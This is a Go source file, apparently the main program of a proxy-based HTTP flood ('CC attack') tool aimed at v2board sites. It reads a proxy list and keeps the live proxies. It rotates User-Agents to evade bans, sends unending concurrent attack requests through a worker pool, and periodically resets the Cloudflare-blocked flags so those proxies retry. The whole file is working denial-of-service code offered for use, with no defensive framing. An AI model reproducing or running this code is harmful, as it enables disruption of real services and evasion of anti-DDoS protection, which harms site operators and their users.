package main

import (
	"fmt"
	"github.com/go-resty/resty/v2"
	"io/ioutil"
	"sync"
	"time"

	"github.com/panjf2000/ants/v2"

	"github.com/thank243/v2board_cc/config"
	"github.com/thank243/v2board_cc/utils"
)

func main() {
	var wg sync.WaitGroup
	buf, err := ioutil.ReadFile("proxies.yaml")
	if err != nil {
		fmt.Println(err)
		return
	}
	r, err := config.UnmarshalRawConfig(buf)
	if err != nil {
		fmt.Println(err)
	}
	pMaps, err := config.ParseProxies(r)
	if err != nil {
		fmt.Println(err)
	}

	var PList []utils.Nodes
	for _, v := range pMaps {
		PList = append(PList, utils.Nodes{Proxy: v})
	}

	counts := 0
	var (
		alivePlist []utils.Nodes
		resp       resty.Response
	)

	switch config.Cfg.FilterNode {
	case true:
		var current *int
		go func() {
			for {
				if current != nil {
					fmt.Printf("\rFilter Processing: %.2f%%", float32(*current*100)/float32(len(PList)))
					if *current == len(PList)-1 {
						break
					}
					time.Sleep(5 * time.Second)
				}
			}
		}()

		var wg sync.WaitGroup
		pool, _ := ants.NewPoolWithFunc(config.Cfg.Connections, func(i interface{}) {
			p := i.(utils.Nodes)
			aliveP, _ := utils.URLTest(&p)
			if aliveP.Proxy != nil {
				alivePlist = append(alivePlist, aliveP)
			}
			wg.Done()
		})

		//initial alive proxies
		fmt.Printf("\nFiltering alive nodes\n")
		for i, p := range PList {
			current = &i
			wg.Add(1)
			err = pool.Invoke(p)
			if err != nil {
				fmt.Println(err.Error())
			}
		}
		wg.Wait()
		pool.Release()
		fmt.Printf("\nFilter Nodes: %d", len(alivePlist))
	default:
		alivePlist = PList
	}

	UAList := utils.GetRandUA()
	minBanned := 0
	go func() {
		for {
			wg.Add(1)
			fmt.Printf("\nRefresh User-Agent.")

			for k, val := range UAList {
				if val.BannedCounts < UAList[minBanned].BannedCounts {
					minBanned = k
				}
			}
			UAList[minBanned] = utils.UserAgent{ID: minBanned, UA: utils.GetRandUA()[minBanned].UA, BannedCounts: UAList[minBanned].BannedCounts}
			wg.Done()
			time.Sleep(10 * time.Second)
		}
	}()
	wg.Wait()

	pool, _ := ants.NewPoolWithFunc(config.Cfg.Connections, func(i interface{}) {
		p := i.(int)
		_ = utils.CCAttack(&alivePlist[p], &counts, &resp, &UAList[minBanned])
		wg.Done()
	})
	defer pool.Release()

	//monitor status
	go func() {
		for {
			i := 0
			for _, v := range alivePlist {
				if !v.CFCheck {
					i++
				}
			}
			fmt.Printf("\nTotal attack: %d [(%d/%d) nodes] - Current connection: %d - StatusCode: %d", counts, i, len(alivePlist), pool.Running(), resp.StatusCode())
			time.Sleep(30 * time.Second)
		}
	}()

	go func() {
		for {
			fmt.Printf("\nReset cloudflare status.")
			for i := range alivePlist {
				alivePlist[i].CFCheck = false
			}
			time.Sleep(300 * time.Second)
		}
	}()

	for {
		switch {
		case len(alivePlist) > 0:
			for i, v := range alivePlist {
				if !v.CFCheck {
					wg.Add(1)
					_ = pool.Invoke(i)
				}
			}
		default:
			time.Sleep(5 * time.Second)
		}
	}
}
